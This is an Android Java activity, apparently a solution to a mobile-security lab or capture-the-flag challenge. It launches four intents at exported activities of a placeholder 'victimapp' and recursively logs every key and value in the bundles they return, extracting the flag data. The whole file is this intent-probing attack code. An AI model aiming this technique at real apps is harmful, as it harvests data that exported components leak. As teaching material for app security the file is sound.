package com.example.justask;

import android.content.Intent;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;

import java.util.ArrayList;
import java.util.Arrays;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MOBIOTSEC";

    private ActivityResultLauncher<Intent> activityLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        Log.d(TAG, "onCreate: ");

        activityLauncher =
                registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
                        result -> {
                            if (result.getData() != null) {
                                Intent intent = result.getData();
                                Bundle extras = intent.getExtras();

                                if (extras != null) {
                                    String[] keys = extras.keySet().toArray(new String[0]);

                                    for (String key : keys) {
                                        Object value = extras.get(key);
                                        Log.d(TAG, "Key: " + key + " Value: " + value);

                                        if (value instanceof Bundle) {
                                            Log.d(TAG, "Value is a bundle");
                                            String[] bundleKeys = cycleBundle((Bundle) value);
                                            for (String bundleKey : bundleKeys) {
                                                Log.d(TAG, "Key: " + bundleKey + " Value: " + ((Bundle) value).get(bundleKey));
                                            }
                                        }
                                    }
                                } else {
                                    Log.d(TAG, "No keys found in extras.");
                                }
                            } else {
                                Log.e(TAG, "Failed to receive hash");
                            }
                        });

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartOne"));
        activityLauncher.launch(intent);

        Intent intent2 = new Intent("com.example.victimapp.intent.action.JUSTASK");

        activityLauncher.launch(intent2);

        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.PartThree"));
        activityLauncher.launch(intent3);

        Intent intent4 = new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
        activityLauncher.launch(intent4);

    }

    private String[] cycleBundle(Bundle bundle) {
        ArrayList<String> keys = new ArrayList<>();

        for (String key : bundle.keySet()) {
            Object value = bundle.get(key);
            String valueType = (value != null) ? value.getClass().getSimpleName() : "null";

            if (valueType.equals("Bundle")) {
                keys.addAll(Arrays.asList(cycleBundle((Bundle) value)));
            }else {
                keys.add(key);
                Log.d(TAG, "Key: " + key + ", Value: " + value + ", Type: " + valueType);
            }
        }

        return keys.toArray(new String[0]);
    }
}